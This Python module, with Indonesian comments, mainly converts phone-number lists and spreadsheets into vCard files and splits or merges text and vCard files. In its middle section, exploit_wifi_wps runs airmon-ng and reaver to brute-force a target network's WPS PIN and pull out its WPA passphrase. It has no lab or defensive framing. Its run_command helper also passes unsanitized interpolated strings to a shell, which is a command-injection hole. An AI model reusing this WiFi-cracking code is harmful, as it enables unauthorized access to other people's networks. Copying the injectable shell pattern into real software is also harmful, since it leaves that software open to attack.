import pandas as pd
import os
import re
import logging
import subprocess

def convert(data):
    numbers = check_number(data['filename'])
    split_number = split(numbers, data['totalc'])

    countc = 0
    countf = 0
    vcf_files = []
    sisa = []
    
    for numbers in split_number:
        vcard_entries = []
        for number in numbers:
            countc += 1
            vcard_entry = f"BEGIN:VCARD\nVERSION:3.0\nFN:{data['cname']}-{countc}\nTEL;TYPE=CELL:+{number}\nEND:VCARD"
            vcard_entries.append(vcard_entry)

        countf += 1
        if countf > data['totalf']:
            sisa.extend(numbers)  # Use extend instead of append to flatten the list
        else:
            vcf_name = f"files/{data['name']}_{countf}.vcf"
            vcf_files.append(vcf_name)
            
            with open(vcf_name, 'w', encoding='utf-8') as vcard_file:
                vcard_file.write("\n".join(vcard_entries) + "\n")
    
    if sisa:
        file_txt = "files/sisa.txt"
        vcf_files.append(file_txt)
        
        with open(file_txt, 'w', encoding='utf-8') as file:
            file.write("\n".join(sisa) + "\n")
    
    return vcf_files

def convert_vcf(data):
    data['filename'] = convert_xlsx_to_txt(data)
    numbers = check_number(data['filename'])
    split_number = split(numbers, data['totalc'])

    countc = 0
    countf = 0
    vcf_files = []
    
    for numbers in split_number:
        vcard_entries = []
        for number in numbers:
            countc += 1
            vcard_entry = f"BEGIN:VCARD\nVERSION:3.0\nFN:{data['cname']}-{countc}\nTEL;TYPE=CELL:+{number}\nEND:VCARD"
            vcard_entries.append(vcard_entry)

        countf += 1
        vcf_name = f"files/{data['name']}_{countf}.vcf"
        vcf_files.append(vcf_name)
        
        with open(vcf_name, 'w', encoding='utf-8') as vcard_file:
            vcard_file.write("\n".join(vcard_entries) + "\n")
        
        if countf == data['totalf']:
            break

    return vcf_files

def convert_xlsx_to_txt(data):
    df = pd.read_excel(data['filename'])
    file_name = f"files/{data['name']}.txt"
    df.to_csv(file_name, index=False, sep='\t')

    return file_name

def check_number(filename):
    """Baca file dan ambil nomor telepon dari setiap baris."""
    numbers = []
    with open(filename, 'r', encoding='utf-8') as file:
        for line in file:
            line = line.strip()
            if line.isdigit():
                numbers.append(line)
    return numbers
        
def pecah_txt(data):
  numbers = check_number(data['filename'])
  split_number = split(numbers, data['totaln'])
  countf = 0
  files = []

  for numbers in split_number:
    countf+=1
    txt_name = f"files/{data['name']}_{countf}.txt"
    files.append(txt_name)

    with open(txt_name, 'w', encoding='utf-8') as file:
      for number in numbers:
        file.write(number + "\n")

    if countf == data['totalf']:
      break
  
  return files

def pecah_vcf(data):
    with open(data['filename'], 'r', encoding='utf-8') as file:
        lines = file.readlines()

    contacts = []
    current_contact = []

    for line in lines:
        if not line.strip():
            continue

        current_contact.append(line)
        if line.strip() == 'END:VCARD':
            contacts.append(current_contact)
            current_contact = []

    split_contact = split(contacts, data['totalc'])
    countf = 0
    files = []

    for contacts in split_contact:
        countf += 1
        file_name = f"files/{data['name']}_{countf}.vcf"
        files.append(file_name)
        
        with open(file_name, 'w', encoding='utf-8') as file:
            file.write("".join("".join(contact) for contact in contacts))

        if countf == data['totalf']:
            break

    return files

def convert_vcf_to_txt(data):
    vcf_file = data.get('filename')
    txt_file = f"files/{data.get('name')}.txt"

    if not vcf_file or not os.path.isfile(vcf_file):
        raise FileNotFoundError(f"File VCF tidak ditemukan: {vcf_file}")

    try:
        with open(vcf_file, 'r', encoding='utf-8') as vcf_file_content:
            vcf_data = vcf_file_content.read()

        # Memproses data VCF untuk mengekstrak nama dan nomor telepon
        lines = vcf_data.split('END:VCARD')
        with open(txt_file, 'w', encoding='utf-8') as txt_file_content:
            for line in lines:
                if 'FN:' in line and 'TEL:' in line:
                    tel = re.search(r'TEL:(\+?\d+)', line)
                    if tel:
                        tel = tel.group(1).strip()
                        tel = re.sub(r'\D', '', tel)  # Menghapus semua karakter non-digit
                        txt_file_content.write(f"{tel}\n")

        return txt_file
    except Exception as e:
        logging.error("Error converting VCF to TXT: ", exc_info=True)
        raise

def gabung_vcf(input_files, output_file):
    logging.info("Memulai penggabungan VCF.")
    with open(output_file, 'wb') as outfile:
        for i, filename in enumerate(input_files):
            logging.info(f"Membaca file: {filename}")
            with open(filename, 'rb') as infile:
                content = infile.read()
                outfile.write(content)
                
            if i < len(input_files) - 1:
                outfile.write(b'\n')

    logging.info(f"Penggabungan selesai. File output: {output_file}")

# Fungsi untuk menyimpan teks ke file TXT
def save_txt(text, filename):
    file_path = os.path.join('files', filename)
    with open(file_path, 'w') as file:
        file.write(text)
    return file_path

# Fungsi untuk menjalankan perintah shell dan mengembalikan output
def run_command(command):
    try:
        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
        return output.decode('utf-8')
    except subprocess.CalledProcessError as e:
        logging.error(f"Command failed: {e}")
        return None

# Fungsi untuk mengeksploitasi WiFi WPS/WPA menggunakan alat `reaver`
def exploit_wifi_wps(interface, bssid, channel):
    try:
        # Set interface ke mode monitor
        run_command(f"airmon-ng start {interface} {channel}")
        
        # Jalankan reaver untuk eksploitasi WPS
        reaver_command = f"reaver -i {interface} -b {bssid} -c {channel} -vv"
        reaver_output = run_command(reaver_command)
        
        # Ekstrak informasi dari output reaver
        ssid = extract_ssid(reaver_output)
        pin = extract_pin(reaver_output)
        password = extract_password(reaver_output)
        security = "WPA/WPA2"  # Logika bisa ditambahkan untuk mendeteksi jenis keamanan lain

        # Asumsikan kelemahan berdasarkan apakah WPS aktif
        weakness = "WPS Enabled" if "WPS" in reaver_output else "No WPS"

        return {
            'ssid': ssid or "Unknown",
            'pin': pin or "Not Found",
            'password': password or "Not Found",
            'security': security,
            'weakness': weakness
        }
    except Exception as e:
        logging.error(f"Error in exploit_wifi_wps: {e}")
        return {
            'ssid': "Unknown",
            'pin': "Not Found",
            'password': "Not Found",
            'security': "Unknown",
            'weakness': "Unknown"
        }

# Fungsi untuk mengekstrak SSID dari output reaver
def extract_ssid(output):
    ssid_match = re.search(r"SSID\s+:\s+(.+)", output)
    if ssid_match:
        return ssid_match.group(1).strip()
    return None

# Fungsi untuk mengekstrak PIN dari output reaver
def extract_pin(output):
    pin_match = re.search(r"WPS PIN:\s+(\d{8})", output)
    if pin_match:
        return pin_match.group(1)
    return None

# Fungsi untuk mengekstrak password dari output reaver
def extract_password(output):
    password_match = re.search(r"PSK\s+:\s+(.+)", output)
    if password_match:
        return password_match.group(1).strip()
    return None

def gabungtxt(input_files, output_file):
    logging.info("Memulai penggabungan TXT.")
    with open(output_file, 'w', encoding='utf-8') as outfile:
        for i, filename in enumerate(input_files):
            logging.info(f"Membaca file: {filename}")
            with open(filename, 'r', encoding='utf-8') as infile:
                content = infile.read()
                outfile.write(content)
                
            if i < len(input_files) - 1:
                outfile.write('\n')  # Tambahkan baris baru antara file jika bukan file terakhir

    logging.info(f"Penggabungan selesai. File output: {output_file}")

def split(arr, num):
    return [arr[x:x+num] for x in range(0, len(arr), num)]

if __name__ == "__main__":
    data = {
        'filename': 'files/11-112.txt',
        'name': 'tes',
        'cname': 'tes',
        'totalc': 100,
        'totalf': 5,
    }
    convert(data)
